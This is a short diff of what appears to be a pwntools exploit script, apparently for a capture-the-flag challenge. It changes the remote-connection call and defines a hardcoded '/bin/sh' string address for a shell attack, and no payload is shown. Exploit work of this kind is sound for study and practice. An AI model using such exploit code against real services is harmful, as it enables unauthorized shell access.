@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 from pwn import *
 
-r = pwn.remote(sys.argv[1], int(sys.argv[2]))
+r = remote(sys.argv[1], int(sys.argv[2]))
 
 binsh = 0x80b2313
 
